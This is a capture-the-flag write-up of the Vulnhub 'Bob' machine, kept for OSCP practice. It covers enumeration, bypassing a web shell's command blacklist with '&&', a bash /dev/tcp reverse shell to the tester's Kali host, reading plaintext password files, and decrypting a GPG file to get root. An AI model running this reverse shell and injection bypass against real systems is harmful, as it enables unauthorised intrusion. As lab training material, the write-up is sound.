---
title: Write-up Bob on Vulnhub
author: eMVee
date: 2023-02-28 20:00:00 +0800
categories: [CTF, Vulnhub]
tags: [Vulnhub, OSCP]
render_with_liquid: false
---

Since I am working towards the OSCP exam I have to practice as much as possible. To practice some machines for OSCP I use the list of TJnull with all kind of vulnerable machines. The machine (Bob) can be downloaded from [Vulnhub](https://www.vulnhub.com/entry/bob-101,226/). After downloading the virtual machine, you have to configure the machine so it is on the same network as your Kali machine.


## Getting started

First things first. As first I would like to know the IP address assigned to my Kali instance.
```bash
┌──(emvee㉿kali)-[~]
└─$ myip               

    inet 127.0.0.1
    inet 10.0.2.15

```
Since we know our own IP address now we can start enumerating.

## Enumeration
Let's enumerate with fping the whole virtual network in my pentestlab.
```bash
┌──(emvee㉿kali)-[~]
└─$ fping -ag 10.0.2.0/24 2> /dev/null 
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.21

```
It looks like there is a new IP address available in my virtual network, now let's confirm this with arp-scan.
```bash
┌──(emvee㉿kali)-[~]
└─$ sudo arp-scan --localnet        
[sudo] password for emvee: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:e0:29:f9, IPv4: 10.0.2.15
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:45:11:52       PCS Systemtechnik GmbH
10.0.2.21       08:00:27:8c:f2:20       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.8: 256 hosts scanned in 2.168 seconds (118.08 hosts/sec). 4 responded

```

Before continuing with enumerating and hacking the machine, I have to create a working directory to store files and data.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/Vulnhub

┌──(emvee㉿kali)-[~/Documents/Vulnhub]
└─$ mcd Bob1    

┌──(emvee㉿kali)-[~/Documents/Vulnhub/Bob1]
└─$ ip=10.0.2.21

```
Since evertying is set, now let us see if the machine does reply to a ping request.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Bob1]
└─$ ping $ip -c 3                             
PING 10.0.2.21 (10.0.2.21) 56(84) bytes of data.
64 bytes from 10.0.2.21: icmp_seq=1 ttl=64 time=0.518 ms
64 bytes from 10.0.2.21: icmp_seq=2 ttl=64 time=0.728 ms
64 bytes from 10.0.2.21: icmp_seq=3 ttl=64 time=0.656 ms

--- 10.0.2.21 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2101ms
rtt min/avg/max/mdev = 0.518/0.634/0.728/0.087 ms

```
Based on the `ttl=64` we can tell this machine is running on probably a Linux distro. Now let's run a quick port scan with nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Bob1]
└─$ nmap -T4 -Pn $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 10:35 CET
Nmap scan report for 10.0.2.21
Host is up (0.00034s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.10 seconds
```
Since I had run a simple nmap port scan I decided to run an advanced scan in another second terminal.
Let's run a quick check with whatweb in the first terminal to identify some technologies used on this machine.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Bob1]
└─$ whatweb http://$ip                                                               
http://10.0.2.21 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.0.2.21]

```
The webserver is running on
* Probably Debian?
* Apache 2.4.25

With Nikto it is possible to identify vulnerabilities and found sensitive information.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Bob1]
└─$ nikto -h http://$ip
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.21
+ Target Hostname:    10.0.2.21
+ Target Port:        80
+ Start Time:         2023-02-28 10:35:30 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/dev_shell.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/lat_memo.html' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/passwords.html' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Server may leak inodes via ETags, header found with file /, inode: 591, size: 5669af30ee8f1, mtime: gzip
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.html: Admin login page/section found.
+ 7919 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2023-02-28 10:36:36 (GMT1) (66 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Nikto has found some interesting information such as:
* robots.txt
	* /dev_shell.php
	* /lat_memo.html
	* /passwords.html
* Admin login page/section found
	* /login.html

Let's get back to the advanced nmap scan results.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Bob1]
└─$ sudo nmap -sC -sV -T4 -A -p- $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 10:38 CET
Nmap scan report for 10.0.2.21
Host is up (0.00050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 4 disallowed entries 
| /login.php /dev_shell.php /lat_memo.html 
|_/passwords.html
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 84f2f8e5ed3e14f393d41e4c413ba2a9 (RSA)
|   256 5b98c74f846efd566a351683aa9ceaf8 (ECDSA)
|_  256 391656fb4e0f508540d3532241433815 (ED25519)
MAC Address: 08:00:27:8C:F2:20 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms 10.0.2.21

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.93 seconds

```
Since nmap has finished the scan, let's check te results. Nmap found some additional information, let's update our notes:
* Linux
	* Debian?
* Port 80
	* HTTP
	* Apache 2.4.25
	* robots.txt
		* /dev_shell.php
		* /lat_memo.html
		* /passwords.html
		* /login.php
* Port 25468
	* SSH
	* OpenSSH 7.4p1 Debian 10+deb9u2

We have identified some interesting files with nikto and nmap. We have to inspect those files. 
Let's start inspecting the passwords.html file.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Bob1]
└─$ curl http://$ip/passwords.html
<!-- N.T.S Get Sticky Notes to Write Passwords in
-Bob
-->
<!--

-=====Passwords:==-<!
=======-
-->
<!--
-=====WEBSHELL=======-
-->
<!--p
-->
<!--
-====================-

 -->
<html>
<body>
  Really who made this file at least get a hash of your password to display,
  hackers can't do anything with a hash, this is probably why we had a security
  breach in the first place. Comeon
  people this is basic 101 security! I have moved the file off the server. Don't make me have to clean up the mess everytime
  someone does something as stupid as this. We will have a meeting about this and other
  stuff I found on the server. >:(
<br>
  -Bob
  </fieldset>
</body>
</html>
```
Since we have a username `Bob`, but not a password yet we have to inspect the other files as well.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Bob1]
└─$ curl http://$ip/lat_memo.html 
<html>
  <style>

    body{
      background-color: #d7b5b5;
    }

    a:link, a:visited {
    color: #fff000;
    }

    #banner{
      position: absolute;
      top: 0px;
      left: 0px;
      right: 0px;
      width: 100%;
      height: 100px;
      z-index: -11;
      background: linear-gradient(to right, #9f0000 0%,#520000 100%);
      /* background: linear-gradient(to right, #0049db 0%,#ffffff 100%); /* Old Banner Colors*/
    }

    #logo{
      position: absolute;
      top: 1px;
      left: 3px;
      right: 0px;
      width: auto;
      height: 100%;
      z-index: -10;
      max-height: 100px;
    }

    #bannertext{
      color: #fff000;
      position: absolute;
      top: -5px;
      left: 100px;
      right: 0px;
      z-index: -9;
      max-height: 95px;
    }

    #memocontainer{
      position: absolute;
      color: #fff000;
      top: 110px;
      left: 10px;
      right: 10px;
      background-color: #520000;
      color: #fff000;
    }

  </style>
  <body>
    <div id="back">
    <div id="banner" alt="School Banner">
        <img src="school_badge.png" id="logo">
        <div id="bannertext">
          <h1> Milburg Highschool </h1>
          <a href="index.html">Home</a>
          <a href="news.html">News</a>
          <a href="about.html">About Us</a>
          <a href="contact.html">Contact Us</a>
          <a href="login.html">Login</a>
      </div>
    </div>
    <div id="memocontainer">
      <p>
        Memo sent at GMT+10:00 2:37:42 by User: Bob
        <br>
        Hey guys IT here don't forget to check your emails regarding the recent security breach.
        There is a web shell running on the server with no protection but it should be safe as
        I have ported over the filter from the old windows server to our new linux one. Your email
        will have the link to the shell.<br>
        <br>
        -Bob
      </p>
    </div>
  </div>
  </body>
</html>

```
Based on the page `lat_memo.html`, we can confirm that Bob is an user on the system.
* Username: Bob

Now let's visit the website to see what we can discover more.
![Image](/assets/img/WriteUp/Vulnhub/Bob/Pasted image 20230228104749.png){: width="700" height="400" }

There was something like a `dev_shell.php` in the results of nikto and nmap as well. This might be interesting if we can run some commands in a web shell.
![Image](/assets/img/WriteUp/Vulnhub/Bob/Pasted image 20230228105018.png){: width="700" height="400" }

It looks like we can run some commands. Let's run the following command to see who we are, what system name it has and the working directory.
```
whoami && hostname && pwd
```

![Image](/assets/img/WriteUp/Vulnhub/Bob/Pasted image 20230228105056.png){: width="700" height="400" }

Since `ls` alone was not working we should use it behind the first command.

```
whoami && ls
```
Now let's find out what interesting files we can discover in the homre directory of www-data.
![Image](/assets/img/WriteUp/Vulnhub/Bob/Pasted image 20230228105224.png){: width="700" height="400" }

There are two backup files in the root directory of the website:
```
dev_shell.php.bak
index.html.bak
```

Let's see what we could discover from those bak files.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Bob1]
└─$ curl http://$ip/dev_shell.php.bak
<html>
<body>
  <?php
    //init
    $invalid = 0;
    $command = ($_POST['in_command']);
    $bad_words = array("pwd", "ls", "netcat", "ssh", "wget", "ping", "traceroute", "cat", "nc");
  ?>
  <style>
    #back{
      position: fixed;
      top: 0;
      left: 0;
      min-width: 100%;
      min-height: 100%;
      z-index:-10
    }
      #shell{
        color: white;
        text-align: center;
    }
  </style>
  <div id="shell">
    <h2>
      dev_shell
    </h2>
    <form action="dev_shell.php" method="post">
      Command: <input type="text" name="in_command" /> <br>
      <input type="submit" value="submit">
    </form>
    <br>
    <h5>Output:</h5>
    <?php
    system("running command...");
      //executes system Command
      //checks for sneaky ;
      if (strpos($command, ';') !==false){
        system("echo Nice try skid, but you will never get through this bulletproof php code"); //doesn't work :P
      }
      else{
        $is_he_a_bad_man = explode(' ', trim($command));
        //checks for dangerous commands
        if (in_array($is_he_a_bad_man[0], $bad_words)){
          system("echo Get out skid lol");
        }
        else{
          system($_POST['in_command']);
        }
      }
    ?>
  </div>
    <img src="dev_shell_back.png" id="back" alt="">
</body>
</html>

```
So they have a black list of commands, but we already discovered the bypass with the `command1 && command2` to run a second command.
Now to make life easier we should start a netcat listener.

```bash
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234

```
Then we could launch a reverse shell as second command like this.
```
id && bash -c 'exec bash -i &>/dev/tcp/10.0.2.15/1234 <&1'
```
![Image](/assets/img/WriteUp/Vulnhub/Bob/Pasted image 20230228110045.png){: width="700" height="400" }

As soon as we hit the `Submit` button we should check our netcat listener.

## Initial access
Now let's see if the connection is established.
```bash
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.2.21.
Ncat: Connection from 10.0.2.21:42094.
bash: cannot set terminal process group (514): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Milburg-High:/var/www/html$ 

```
Now we should do some basic local enumeration. First I wqould like to know who we are, what machine we are working on.
```bash
www-data@Milburg-High:/var/www/html$ whoami && id && hostname
whoami && id && hostname
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data),100(users)
Milburg-High
```
This confirms our earlier commands executed from the web shell. 
We should enumerate some information about the Linux distro and kernel.
```bash
www-data@Milburg-High:/var/www/html$ uname -a
uname -a
Linux Milburg-High 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64 GNU/Linux
www-data@Milburg-High:/var/www/html$ uname -mrs
uname -mrs
Linux 4.9.0-4-amd64 x86_64
www-data@Milburg-High:/var/www/html$ cat /etc/issue
cat /etc/issue
Debian GNU/Linux 9 \n \l
```
It looks like we are running on:
- Debian 9
- Linux 4.9.0-4-amd64 x86_64

Some information what we should add to the notes if we are looking for a system exploit.
Now let's enumerate the normal users on the system.
```bash
www-data@Milburg-High:/var/www/html$ awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
< '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
c0rruptedb1t
bob
jc
seb
elliot

```
There are four users on the system, we should add the usernames to our notes.
Let's see if they have a home directory.

```bash
ls /home
bob
elliot
jc
seb

```

Since we discovered bob earlier, I decided to enumerate further within his home directory.
```bash
www-data@Milburg-High:/var/www/html$ ls -la /home/bob
ls -la /home/bob
total 172
drwxr-xr-x 18 bob  bob   4096 Mar  8  2018 .
drwxr-xr-x  6 root root  4096 Mar  4  2018 ..
-rw-------  1 bob  bob   1980 Mar  8  2018 .ICEauthority
-rw-------  1 bob  bob    214 Mar  8  2018 .Xauthority
-rw-------  1 bob  bob   6403 Mar  8  2018 .bash_history
-rw-r--r--  1 bob  bob    220 Feb 21  2018 .bash_logout
-rw-r--r--  1 bob  bob   3548 Mar  5  2018 .bashrc
drwxr-xr-x  7 bob  bob   4096 Feb 21  2018 .cache
drwx------  8 bob  bob   4096 Feb 27  2018 .config
-rw-r--r--  1 bob  bob     55 Feb 21  2018 .dmrc
drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 .ftp
drwx------  3 bob  bob   4096 Mar  5  2018 .gnupg
drwxr-xr-x  3 bob  bob   4096 Feb 21  2018 .local
drwx------  4 bob  bob   4096 Feb 21  2018 .mozilla
drwxr-xr-x  2 bob  bob   4096 Mar  4  2018 .nano
-rw-r--r--  1 bob  bob     72 Mar  5  2018 .old_passwordfile.html
-rw-r--r--  1 bob  bob    675 Feb 21  2018 .profile
drwx------  2 bob  bob   4096 Mar  5  2018 .vnc
-rw-r--r--  1 bob  bob  25211 Mar  8  2018 .xfce4-session.verbose-log
-rw-r--r--  1 bob  bob  27563 Mar  7  2018 .xfce4-session.verbose-log.last
-rw-------  1 bob  bob   3672 Mar  8  2018 .xsession-errors
-rw-------  1 bob  bob   2866 Mar  7  2018 .xsession-errors.old
drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Desktop
drwxr-xr-x  3 bob  bob   4096 Mar  5  2018 Documents
drwxr-xr-x  3 bob  bob   4096 Mar  8  2018 Downloads
drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Music
drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Pictures
drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Public
drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Templates
drwxr-xr-x  2 bob  bob   4096 Feb 21  2018 Videos

```

There is a hidden file `.old_passwordfile.html` with probably some passwords.
```bash
www-data@Milburg-High:/var/www/html$ cat /home/bob/.old_passwordfile.html
cat /home/bob/.old_passwordfile.html
<html>
<p>
jc:Qwerty
seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
</p>
</html>
www-data@Milburg-High:/var/www/html$ 

```
We should save those passwords for in the future. Now let's find out what we could discover in the home directory for the user elliot.


```bash
www-data@Milburg-High:/var/www/html$ ls -la /home/elliot
ls -la /home/elliot
total 116
drwxr-xr-x 15 elliot elliot  4096 Feb 27  2018 .
drwxr-xr-x  6 root   root    4096 Mar  4  2018 ..
-rw-------  1 elliot elliot     0 Feb 27  2018 .ICEauthority
-rw-------  1 elliot elliot    55 Feb 27  2018 .Xauthority
-rw-------  1 elliot elliot   121 Mar  8  2018 .bash_history
-rw-r--r--  1 elliot elliot   220 Feb 27  2018 .bash_logout
-rw-r--r--  1 elliot elliot  3526 Feb 27  2018 .bashrc
drwxr-xr-x  7 elliot elliot  4096 Feb 27  2018 .cache
drwx------  8 elliot elliot  4096 Feb 27  2018 .config
-rw-r--r--  1 elliot elliot    55 Feb 27  2018 .dmrc
drwx------  3 elliot elliot  4096 Feb 27  2018 .gnupg
drwxr-xr-x  3 elliot elliot  4096 Feb 27  2018 .local
drwx------  4 elliot elliot  4096 Feb 27  2018 .mozilla
-rw-r--r--  1 elliot elliot   675 Feb 27  2018 .profile
-rw-r--r--  1 elliot elliot 17258 Feb 27  2018 .xfce4-session.verbose-log
-rw-------  1 elliot elliot  4486 Feb 27  2018 .xsession-errors
drwxr-xr-x  2 elliot elliot  4096 Feb 27  2018 Desktop
drwxr-xr-x  2 elliot elliot  4096 Feb 27  2018 Documents
drwxr-xr-x  2 elliot elliot  4096 Feb 27  2018 Downloads
drwxr-xr-x  2 elliot elliot  4096 Feb 27  2018 Music
drwxr-xr-x  2 elliot elliot  4096 Feb 27  2018 Pictures
drwxr-xr-x  2 elliot elliot  4096 Feb 27  2018 Public
drwxr-xr-x  2 elliot elliot  4096 Feb 27  2018 Templates
drwxr-xr-x  2 elliot elliot  4096 Feb 27  2018 Videos
-rw-r--r--  1 elliot elliot  1509 Feb 27  2018 theadminisdumb.txt
```
This file `theadminisdumb.txt` looks interesting because the 'admin'part in the file name.
We should open the file and see what juicy information we can find.
```bash
www-data@Milburg-High:/var/www/html$ cat /home/elliot/theadminisdumb.txt
cat /home/elliot/theadminisdumb.txt
The admin is dumb,
In fact everyone in the IT dept is pretty bad but I can’t blame all of them the newbies Sebastian and James are quite new to managing a server so I can forgive them for that password file they made on the server. But the admin now he’s quite something. Thinks he knows more than everyone else in the dept, he always yells at Sebastian and James now they do some dumb stuff but their new and this is just a high-school server who cares, the only people that would try and hack into this are script kiddies. His wallpaper policy also is redundant, why do we need custom wallpapers that doesn’t do anything. I have been suggesting time and time again to Bob ways we could improve the security since he “cares” about it so much but he just yells at me and says I don’t know what i’m doing. Sebastian has noticed and I gave him some tips on better securing his account, I can’t say the same for his friend James who doesn’t care and made his password: Qwerty. To be honest James isn’t the worst bob is his stupid web shell has issues and I keep telling him what he needs to patch but he doesn’t care about what I have to say. it’s only a matter of time before it’s broken into so because of this I have changed my password to

theadminisdumb

I hope bob is fired after the future second breach because of his incompetence. I almost want to fix it myself but at the same time it doesn’t affect me if they get breached, I get paid, he gets fired it’s a good time.

```
Well we could discover some juicy information here about possible passwords:
* Qwerty
* theadminisdumb

Those passwords should be added to our notes.

Now let's see what we can discover in the Documents direcotry of Bob.
```bash
www-data@Milburg-High:/var/www/html$ ls -la /home/bob/Documents
ls -la /home/bob/Documents
total 20
drwxr-xr-x  3 bob bob 4096 Mar  5  2018 .
drwxr-xr-x 18 bob bob 4096 Mar  8  2018 ..
drwxr-xr-x  3 bob bob 4096 Mar  5  2018 Secret
-rw-r--r--  1 bob bob   91 Mar  5  2018 login.txt.gpg
-rw-r--r--  1 bob bob  300 Mar  4  2018 staff.txt

```
There is a directory named `Secret`, this makes me wondering what is hidden in here.
```bash
www-data@Milburg-High:/var/www/html$ ls -la /home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here
<ocuments/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here
total 12
drwxr-xr-x 2 bob bob 4096 Mar  5  2018 .
drwxr-xr-x 3 bob bob 4096 Mar  5  2018 ..
-rwxr-xr-x 1 bob bob  438 Mar  5  2018 notes.sh
```
It looks like there are several directories within the `Secret` directory and one files called `notes.sh`.
The file cannot be changed by us, so we should find out what this script could do if it is executed.
```bash
www-data@Milburg-High:/var/www/html$ cat /home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here/notes.sh 
<Secret/Keep_Out/Not_Porn/No_Lookie_In_Here/notes.sh
#!/bin/bash
clear
echo "-= Notes =-"
echo "Harry Potter is my faviorite"
echo "Are you the real me?"
echo "Right, I'm ordering pizza this is going nowhere"
echo "People just don't get me"
echo "Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh <sea santy here>"
echo "Cucumber"
echo "Rest now your eyes are sleepy"
echo "Are you gonna stop reading this yet?"
echo "Time to fix the server"
echo "Everyone is annoying"
echo "Sticky notes gotta buy em"
www-data@Milburg-High:/var/www/html$ 
```
It took me a while to discover the secret but after finding the [acrostic](https://en.wikipedia.org/wiki/Acrostic) and the word [harpocrates](https://en.wikipedia.org/wiki/Harpocrates), I knew the secret.

```
HARPOCRATES
```
Since we have enumerated a lot of information we should consider trying to logon to the SSH server on port 25468 with eliot.


```bash
┌──(emvee㉿kali)-[~]
└─$ ssh elliot@$ip -p 25468   
The authenticity of host '[10.0.2.8]:25468 ([10.0.2.8]:25468)' can't be established.
ED25519 key fingerprint is SHA256:OY3LVMIRHTASgrwg8mXjqq8nFPrcwLV7lhRz0gpjwq4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.0.2.8]:25468' (ED25519) to the list of known hosts.
  __  __ _ _ _                        _____                          
 |  \/  (_) | |                      / ____|                         
 | \  / |_| | |__  _   _ _ __ __ _  | (___   ___ _ ____   _____ _ __ 
 | |\/| | | | '_ \| | | | '__/ _` |  \___ \ / _ \ '__\ \ / / _ \ '__|
 | |  | | | | |_) | |_| | | | (_| |  ____) |  __/ |   \ V /  __/ |   
 |_|  |_|_|_|_.__/ \__,_|_|  \__, | |_____/ \___|_|    \_/ \___|_|   
                              __/ |                                  
                             |___/                                   


elliot@10.0.2.8's password: 
Linux Milburg-High 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
elliot@Milburg-High:~$ 
```
As usual we do some basic commands to see who we are and what memberships we have.
```bash
elliot@Milburg-High:~$ whoami;id;hostname;pwd
elliot
uid=1004(elliot) gid=1004(elliot) groups=1004(elliot),100(users)
Milburg-High
/home/elliot
```
Nothing special, so we should find out if we have some sudo permissions.
```bash
elliot@Milburg-High:~$ sudo -l
sudo: unable to resolve host Milburg-High
Matching Defaults entries for elliot on Milburg-High:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User elliot may run the following commands on Milburg-High:
    (ALL) NOPASSWD: /usr/bin/service apache2 *
    (root) NOPASSWD: /bin/systemctl start ssh
elliot@Milburg-High:~$ 
```
So we can sudo two commands, but I have no idea how I can use this to escalate our privileges.
Then I suddenly remember that I saw something in the home directory of Bob. Let's check it again.
```bash
seb@Milburg-High:~$ cd /home/bob/Documents/
seb@Milburg-High:/home/bob/Documents$ ls -la
total 20
drwxr-xr-x  3 bob bob 4096 Mar  5  2018 .
drwxr-xr-x 18 bob bob 4096 Mar  8  2018 ..
-rw-r--r--  1 bob bob   91 Mar  5  2018 login.txt.gpg
drwxr-xr-x  3 bob bob 4096 Mar  5  2018 Secret
-rw-r--r--  1 bob bob  300 Mar  4  2018 staff.txt
```
There is a interesting file `login.txt.gpg` available. GPG is also known as GNU Privacy Guard.
Let's host a python webserver so we are able to download the file from the victim.
```bash
seb@Milburg-High:/home/bob/Documents$ python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
```
As soon as the python webserver is running we can download the file with wget.

```bash
┌──(emvee㉿kali)-[~/Documents/Bob]
└─$ wget http://10.0.2.8:8080/login.txt.gpg 
--2022-09-26 20:57:16--  http://10.0.2.8:8080/login.txt.gpg
Connecting to 10.0.2.8:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 91 [application/octet-stream]
Saving to: ‘login.txt.gpg’

login.txt.gpg                100%[==============================================>]      91  --.-KB/s    in 0s      

2022-09-26 20:57:17 (2.57 MB/s) - ‘login.txt.gpg’ saved [91/91]
```
Since the file has been downloaded to our Kali machine we can see what content is within the file.
To open this we need the secret we discovered earlier.
```bash
┌──(emvee㉿kali)-[~/Documents/Bob]
└─$  gpg -d login.txt.gpg
gpg: AES.CFB encrypted data
gpg: encrypted with 1 passphrase
bob:b0bcat_

```
The password for bob has been discovered. This gives us the opportunity to switch user to Bob.

## Privilege escalation
Now let's switch user.
```bash
seb@Milburg-High:/home/bob/Documents$ su bob
Password: 
bob@Milburg-High:~/Documents$ 
```
One of the first thing we should do with a new user is to find out if the user has sudo permissions.
```bash
bob@Milburg-High:~/Documents$ sudo -l
sudo: unable to resolve host Milburg-High
[sudo] password for bob: 
Matching Defaults entries for bob on Milburg-High:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bob may run the following commands on Milburg-High:
    (ALL : ALL) ALL
```
Since we can sudo anything, we are able to switch user to root and change the working directory to the root directory.
```bash
bob@Milburg-High:~/Documents$ sudo su
sudo: unable to resolve host Milburg-High
root@Milburg-High:/home/bob/Documents# ls /root
```
Now we should look if the root flag is here.

```bash
root@Milburg-High:/# ls -la
total 88
drwxr-xr-x  22 root root  4096 Mar  5  2018 .
drwxr-xr-x  22 root root  4096 Mar  5  2018 ..
drwxr-xr-x   2 root root  4096 Feb 21  2018 bin
drwxr-xr-x   3 root root  4096 Feb 21  2018 boot
drwxr-xr-x  18 root root  3040 Sep 25 14:04 dev
drwxr-xr-x 114 root root  4096 Sep 25 14:04 etc
-rw-------   1 root root   335 Mar  5  2018 flag.txt
drwxr-xr-x   6 root root  4096 Mar  4  2018 home
lrwxrwxrwx   1 root root    29 Feb 21  2018 initrd.img -> boot/initrd.img-4.9.0-4-amd64
lrwxrwxrwx   1 root root    29 Feb 21  2018 initrd.img.old -> boot/initrd.img-4.9.0-4-amd64
drwxr-xr-x  15 root root  4096 Feb 21  2018 lib
drwxr-xr-x   2 root root  4096 Feb 21  2018 lib64
drwx------   2 root root 16384 Feb 21  2018 lost+found
drwxr-xr-x   3 root root  4096 Feb 21  2018 media
drwxr-xr-x   2 root root  4096 Feb 21  2018 mnt
drwxr-xr-x   2 root root  4096 Feb 21  2018 opt
dr-xr-xr-x 114 root root     0 Sep 25 14:04 proc
drwx------  16 root root  4096 Feb 28  2018 root
drwxr-xr-x  23 root root   680 Sep 26 14:18 run
drwxr-xr-x   2 root root  4096 Feb 21  2018 sbin
drwxr-xr-x   3 root root  4096 Mar  4  2018 srv
dr-xr-xr-x  13 root root     0 Sep 25 14:04 sys
drwxrwxrwt  11 root root  4096 Sep 26 15:09 tmp
drwxr-xr-x  10 root root  4096 Feb 21  2018 usr
drwxr-xr-x  12 root root  4096 Feb 28  2018 var
lrwxrwxrwx   1 root root    26 Feb 21  2018 vmlinuz -> boot/vmlinuz-4.9.0-4-amd64
lrwxrwxrwx   1 root root    26 Feb 21  2018 vmlinuz.old -> boot/vmlinuz-4.9.0-4-amd64
```

The final step, let's capture the flag!
``` bash
root@Milburg-High:/# cat flag.txt 
CONGRATS ON GAINING ROOT

        .-.
       (   )
        |~|       _.--._
        |~|~:'--~'      |
        | | :   #root   |
        | | :     _.--._|
        |~|~`'--~'
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
   _____|_|_________ Thanks for playing ~c0rruptedb1t
root@Milburg-High:/# 
```
